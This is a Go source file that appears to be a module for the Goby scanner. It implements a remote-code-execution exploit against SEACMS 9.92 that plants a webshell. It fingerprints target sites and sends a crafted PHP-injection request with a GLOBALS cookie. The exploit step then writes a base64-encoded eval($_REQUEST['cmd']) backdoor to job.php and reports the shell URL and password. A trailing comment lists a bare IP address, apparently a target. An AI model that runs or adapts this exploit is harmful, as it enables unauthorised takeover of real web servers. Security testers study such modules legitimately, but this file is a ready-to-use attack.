package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "SEACMS sql.class.php GetShell",
    "Description": "The incomplete filtering in the latest version of seacms can bypass the new version of variable coverage and getshell",
    "Product": "seacms 9.92",
    "Homepage": "https://www.seacms.net/",
    "DisclosureDate": "2021-06-09",
    "Author": "834714370@qq.com",
    "GobyQuery": "body=\"/templets/default/images/js/\" || (title==\"seacms\" || body=\"Powered by SeaCms\" || body=\"content=\\\"seacms\" || body=\"seacms.cms.nav('{$model}')\" || body=\"sea-vod-type\" || body=\"http://www.seacms.net\" || (body=\"search.php?searchtype=\" && (body=\"/list/?\" || body=\"seacms:sitename\")))",
    "Level": "3",
    "Impact": "<p>The incomplete filtering in the latest version of seacms can bypass the new version of variable coverage and getshell</p>",
    "Recommendation": "",
    "References": [
        "https://xz.aliyun.com/t/6191"
    ],
    "HasExp": true,
    "ExpParams": null,
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": [
        "RCE"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10215"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := "5219678c787e30bc11191474593749d8"
			cfg := httpclient.NewGetRequestConfig("/?*/echo(md5('This%20is%20my%20job'));@unlink(__FILE__);/*")
			cfg.VerifyTls = false
			cfg.Header.Store("Cookie", "GLOBALS[db_host]=1")

			if _, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp, err := httpclient.SimpleGet(u.FixedHostInfo + "/data/mysqli_error_trace.php"); err == nil {
					if strings.Contains(resp.Utf8Html, checkStr) {
						return true
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			checkStr := "5219678c787e30bc11191474593749d8"
			shellcode := "PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTsgPz4=" // <?php eval($_REQUEST['cmd']); ?>
			cfg := httpclient.NewGetRequestConfig("/?*/echo(md5('This%20is%20my%20job'));file_put_contents('job.php',base64_decode('" + shellcode + "'));@unlink(__FILE__);/*")
			cfg.VerifyTls = false
			cfg.Header.Store("Cookie", "GLOBALS[db_host]=1")

			if _, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + "/data/mysqli_error_trace.php"); err == nil {
					if strings.Contains(resp.Utf8Html, checkStr) {
						expResult.Success = true
						expResult.Output = "Webshell url: " + expResult.HostInfo.FixedHostInfo + "/data/job.php , pass: cmd"
					}
				}
			}
			return expResult
		},
	))
}

// http://47.117.113.24:8080/
